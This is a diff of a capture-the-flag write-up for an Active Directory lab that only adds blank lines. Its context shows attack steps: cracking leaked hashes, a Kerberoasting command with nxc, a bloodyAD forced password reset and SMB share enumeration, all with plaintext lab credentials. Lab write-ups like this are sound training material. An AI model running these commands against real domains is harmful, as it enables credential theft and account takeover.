@@ -136,6 +136,7 @@ The web server is just the default Microsoft IIS server page.
 We were given a leaked database file with potential usernames and password hashes.
 
 The go-to utility for me when cracking hashes is [CrackStation](crackstation.net):
+
 ![image1.png](bm-images/image1.png)
 
 Successful cracks:
@@ -246,6 +247,7 @@ Looking at the domain users and groups, I get a rough idea of the attack path.
 
 ### Attack: Kerberoasting
 I identified a `ServicePrincipalName` (SPN) associated with the `r.haggard` user, so I'll attempt `keberoasting`:
+
 ![image3.png](bm-images/image3.png)
 ```bash
 nxc ldap buildingmagic.local -u r.widdleton -p 'lilronron' --kerberoasting output.txt
@@ -275,6 +277,7 @@ bloodyAD -d buildingmagic.local -u 'r.haggard' -p 'rubeushagrid' --dc-ip 10.0.29
 [+] Password changed successfully!
 ```
 `h.potch:123456`
+
 Enumerating the SMB shares as the `h.potch` user, I identified a writable share:
 ```bash
 nxc smb 10.0.29.68 -u h.potch -p '123456' --shares
